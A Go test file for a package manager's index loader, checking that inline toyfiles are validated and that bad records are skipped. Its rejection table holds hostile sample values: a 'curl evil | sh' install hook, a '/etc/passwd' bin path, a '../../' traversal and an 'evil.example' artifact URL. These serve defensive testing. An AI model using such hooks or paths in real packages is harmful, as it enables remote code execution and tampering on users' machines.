package index

import (
	"reflect"
	"strings"
	"testing"

	"github.com/Cirraya-LLC/toy/internal/toyfile"
)

const inlineGood = `
name = "tinyserve"

[bin]
tinyserve = "tinyserve"

[artifact]
"linux/amd64" = "tinyserve_{version}_linux_amd64.tar.gz"
`

func loadOne(t *testing.T, e Entry) (*Index, int) {
	t.Helper()
	idx := &Index{Version: Version, Packages: []Entry{e}}
	data, err := idx.Marshal()
	if err != nil {
		t.Fatal(err)
	}
	got, skipped, err := Load(data, "default")
	if err != nil {
		t.Fatal(err)
	}
	return got, skipped
}

func TestLoadKeepsGoodInlineToyfile(t *testing.T) {
	got, skipped := loadOne(t, Entry{ID: "Derrity/tinyserve", Source: "github:Derrity/tinyserve", Toyfile: inlineGood})
	if skipped != 0 || len(got.Packages) != 1 {
		t.Fatalf("a valid inline toyfile was skipped: skipped=%d packages=%d", skipped, len(got.Packages))
	}
	if got.Packages[0].Toyfile != inlineGood {
		t.Error("the raw inline toyfile was not preserved")
	}
}

// A bad inline toyfile must be judged a bad record at Load time. Letting it blow
// up at install time means the user is already waiting on a download, and the
// error reads like a problem with the upstream repo.
func TestLoadSkipsBadInlineToyfile(t *testing.T) {
	bad := map[string]string{
		"not TOML":                       "this is not toml {{{",
		"no name":                        "[bin]\nx = \"x\"\n[artifact]\n\"linux/amd64\" = \"a.tar.gz\"\n",
		"neither artifact nor script":    "name = \"x\"\n",
		"bin points at an absolute path": "name = \"x\"\n[bin]\nx = \"/etc/passwd\"\n[artifact]\n\"linux/amd64\" = \"a.tar.gz\"\n",
		"bin contains ..":                "name = \"x\"\n[bin]\nx = \"../../x\"\n[artifact]\n\"linux/amd64\" = \"a.tar.gz\"\n",
		"artifact is a URL":              "name = \"x\"\n[bin]\nx = \"x\"\n[artifact]\n\"linux/amd64\" = \"https://evil.example/x.tar.gz\"\n",
		"illegal platform key":           "name = \"x\"\n[bin]\nx = \"x\"\n[artifact]\n\"Linux\" = \"a.tar.gz\"\n",
		"carries a hook key":             "name = \"x\"\ninstall = \"curl evil | sh\"\n[bin]\nx = \"x\"\n[artifact]\n\"linux/amd64\" = \"a.tar.gz\"\n",
	}
	for name, tf := range bad {
		t.Run(name, func(t *testing.T) {
			got, skipped := loadOne(t, Entry{ID: "a/b", Source: "github:a/b", Toyfile: tf})
			if skipped != 1 || len(got.Packages) != 0 {
				t.Fatalf("this inline toyfile should have been judged a bad record: skipped=%d packages=%d", skipped, len(got.Packages))
			}
		})
	}
}

// The inline copy goes through exactly the same ParseFrom as upstream; only the
// Origin differs.
func TestInlineParsesWithIndexOrigin(t *testing.T) {
	tf, err := toyfile.ParseFrom([]byte(inlineGood), toyfile.OriginIndex)
	if err != nil {
		t.Fatal(err)
	}
	if tf.Origin != toyfile.OriginIndex {
		t.Errorf("Origin = %q, want %q", tf.Origin, toyfile.OriginIndex)
	}
	up, err := toyfile.Parse([]byte(inlineGood))
	if err != nil {
		t.Fatal(err)
	}
	if up.Origin != toyfile.OriginUpstream {
		t.Errorf("Parse gave Origin = %q, want %q", up.Origin, toyfile.OriginUpstream)
	}
	// Apart from Origin the two parses must agree — validation has no second,
	// looser path.
	tf.Origin, up.Origin = "", ""
	if !reflect.DeepEqual(tf, up) {
		t.Error("the same bytes parsed differently depending on their origin")
	}
}

// A toy.toml must not be able to declare its own origin: if it could, the inline
// copy could pose as upstream — and the trust tier is assigned by origin.
func TestToyfileCannotDeclareItsOwnOrigin(t *testing.T) {
	_, err := toyfile.ParseFrom([]byte("origin = \"upstream\"\n"+inlineGood), toyfile.OriginIndex)
	if err == nil || !strings.Contains(err.Error(), "does not recognize") {
		t.Fatalf("an origin key in toy.toml must be rejected as an unrecognized key, got %v", err)
	}
}
